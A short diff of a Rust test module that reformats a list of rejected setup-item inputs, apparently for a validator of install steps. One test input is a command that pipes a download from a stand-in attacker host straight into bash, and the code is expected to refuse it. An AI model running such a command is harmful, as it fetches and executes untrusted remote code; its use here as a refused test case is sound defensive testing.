@@ -351,7 +351,10 @@ mod tests {
 
         // Anything not a known item id is refused with JS String() spelling.
         let bad_cases: Vec<(Vec<Value>, &str)> = vec![
-            (vec![json!("bun-install")], "Unknown setup item: bun-install"),
+            (
+                vec![json!("bun-install")],
+                "Unknown setup item: bun-install",
+            ),
             (
                 vec![json!("curl https://evil.example | bash")],
                 "Unknown setup item: curl https://evil.example | bash",
